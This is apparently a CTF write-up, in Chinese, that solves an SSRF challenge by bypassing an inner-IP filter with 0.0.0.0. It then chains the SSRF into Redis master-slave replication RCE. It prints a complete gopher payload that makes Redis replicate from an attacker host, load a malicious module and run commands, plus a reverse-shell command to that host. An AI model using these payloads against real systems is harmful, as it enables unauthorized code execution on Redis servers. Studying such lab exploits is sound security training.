---
Author: Coder-LYQ
Date: 2021-01-20
---

## 思路

1. 打开网页首先是一段php代码，整体是两个函数，和一个if-else结构。

   首先重点分析if-else结构，如下。

   可以看出会接收url参数值，并利用safe_request_url()检查该url是否符合要求。

   最后的注释也提示了本地访问hint.php，这是比较典型的ssrf题目。

   ```php
   if(isset($_GET['url'])){
       $url = $_GET['url'];
       if(!empty($url)){
           safe_request_url($url);
       }
   }
   else{
       highlight_file(__FILE__);
   }
   // Please visit hint.php locally.
   ```

2. 分析safe_request_url()函数，会检查url是否为内部IP地址，若不是才会进行curl请求。

   判断url是否为内部IP地址调用的是check_inner_ip()函数，利用parse_url函数判断，并判断host对应的IP是否属于127.0.0.0、10.0.0.0、172.16.0.0、192.168.0.0这四个网段。这里的判断方法与题目[第二章 web进阶 SSRF Training](../N1BOOK/[第二章%20web进阶]SSRF %20Training)类似。

   但是这里如果输入`url=http://@127.0.0.1:80@www.baidu.com/hint.php`会显示bool(false)

   参考其他wp，使用`url=http://0.0.0.0/hint.php`  （0.0.0.0代表本机IPv4的所有地址）

3. 访问hint.php，可以获取线索redis的密码是root

   <img src="images/image-20210120140658273.png" alt="image-20210120140658273" width="60%;" />

4. 后续的思路即为尝试获取webshell，通常ssrf+redis来getshell主要有四种方法：

   1. 可写webshell
   2. 写ssh公钥
   3. 写crontab反弹shell
   4. redis主从复制rce

5. 本题使用**主从复制**的方式

   具体实践步骤如下：

   两个工具：

   https://github.com/n0b0dyCN/redis-rogue-server

   https://github.com/xmsec/redis-ssrf

6. 另开一个浏览器，并申请一个小号，在basic的Linux lab中开启一个环境，如下，分配的端口为28396。

   然后我们利用xshell登录到该Linuxlab服务端，用户名为root，密码为123456。

<img src="images/image-20210120145403136.png" alt="image-20210120145403136" width="33%;" />

7. 再利用xftp，同样登录该服务端，并上传前面下的两个工具，并将redis-rogue-server-master中的exp.so复制到redis-ssrf-master中。

   ![image-20210120145952017](images/image-20210120145952017.png)

   然后需要修改ssrf-redis.py文件，将其中的ip和端口改为linuxLab对应的ip地址。

   <img src="images/image-20210120150354226.png" alt="image-20210120150354226" width="50%;" />

   ![image-20210120150412426](images/image-20210120150412426.png)

   <img src="images/image-20210120152220846.png" alt="image-20210120152220846" width="50%;" />

8. `python ssrf-redis.py`，生成payload。

   该脚本默认mode=3，即直接生成redis的rce。

   生成的payload为：

   ```html
   gopher://0.0.0.0:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A3%0D%0A%247%0D%0ASLAVEOF%0D%0A%2414%0D%0A172.16.163.170%0D%0A%244%0D%0A6666%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%245%0D%0A/tmp/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%246%0D%0Aexp.so%0D%0A%2A3%0D%0A%246%0D%0AMODULE%0D%0A%244%0D%0ALOAD%0D%0A%2411%0D%0A/tmp/exp.so%0D%0A%2A2%0D%0A%2411%0D%0Asystem.exec%0D%0A%2414%0D%0Acat%24%7BIFS%7D/flag%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A
   ```

   将该payload解码之后如下：

   ```shell
   gopher://0.0.0.0:6379/_*2
   $4
   AUTH
   $4
   root
   *3
   $7
   SLAVEOF
   $14
   172.16.163.170
   $4
   6666
   *4
   $6
   CONFIG
   $3
   SET
   $3
   dir
   $5
   /tmp/
   *4
   $6
   config
   $3
   set
   $10
   dbfilename
   $6
   exp.so
   *3
   $6
   MODULE
   $4
   LOAD
   $11
   /tmp/exp.so
   *2
   $11
   system.exec
   $14
   cat${IFS}/flag
   *1
   $4
   quit
   ```

   上面的payload其实是利用gopher协议执行了三条命令，拆分开来如下：

   ```shell
   gopher://0.0.0.0:6379/_auth root
   config set dir /tmp/
   quit
   //设置备份文件路径为/tmp/ 顺便说一下看到当时大佬的博客说试了很多目录，最后发现只有/tmp有权限 ，只需要有读权限即可，所以说平时做渗透或者做题好多试试啊
   
   gopher://0.0.0.0:6379/_auth root
   config set dbfilename exp.so
   slaveof 172.16.163.170 6666
   quit
   //设置备份文件名为：exp.so，设置主redis地址为172.16.163.170，端口为6666 地址为buu开启的linux lab地址
   
   gopher://0.0.0.0:6379/_auth root
   module load /tmp/exp.so
   system.rev 172.16.163.170 6663
   quit
   //导入 exp.so ，反弹shell到172.16.163.170:6663
   
   ```

   

9. 因为题目用到curl，因此还需将生成的payload进行一次url编码。（[推荐网站](http://www.jsons.cn/urlencode/)）

   然后python rogue-server.py进行监听。在题目web界面输入两次url=payload，即可获得flag。

   <img src="images/image-20210120152730096.png" alt="image-20210120152730096" style="zoom:50%;" />

   <img src="images/image-20210120152711275.png" alt="image-20210120152711275" width="50%;" />

10. 附录源码：

```php
<?php
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
}

function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }
}
?>
```



## 总结

- 本题有一定难度，感觉需要了解的还比较多，需要平时对一些漏洞多点了解
- ssrf+redis  主从复制rce，用到了两个工具脚本。
- redis 4.x/5.x RCE漏洞



## 参考链接

- [借鉴思路](https://blog.csdn.net/weixin_43610673/article/details/106457180)
- [修改了生成payload的脚本，可学习](https://blog.csdn.net/weixin_42345596/article/details/111312263)
- [redis+ssrf攻击方式总结](https://www.cnblogs.com/20175211lyz/p/13415749.html)